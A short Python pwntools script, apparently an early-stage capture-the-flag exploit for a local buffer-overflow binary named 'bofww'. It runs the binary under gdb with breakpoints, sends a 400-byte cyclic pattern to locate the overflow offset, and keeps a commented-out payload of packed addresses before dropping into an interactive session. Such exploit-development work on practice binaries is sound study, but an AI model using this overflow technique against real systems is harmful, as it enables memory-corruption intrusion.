#!/usr/bin/python3

from pwn import *
context.terminal = ['tmux', 'new-window']
e = ELF("./bofww")
context.update(arch='amd64',os='linux',bits='64', endian='little')
use_gdb = True

if use_gdb:
    c = gdb.debug('./bofww', '''
    break main
    break*input_person
    break*input_person+185
    break __GI___libc_free
    ''')
else:
    c = process(e.path)
# 7fffffffe100
# 0x7fffffffe210  0x40141a
log.info(c.recv(500))
c.sendline(cyclic(400))#p64(0x7fffffffe210) + p64(0x40141a))
log.info(c.recv(500))
c.sendline(b'5')
log.info(c.recv(500))
c.interactive()
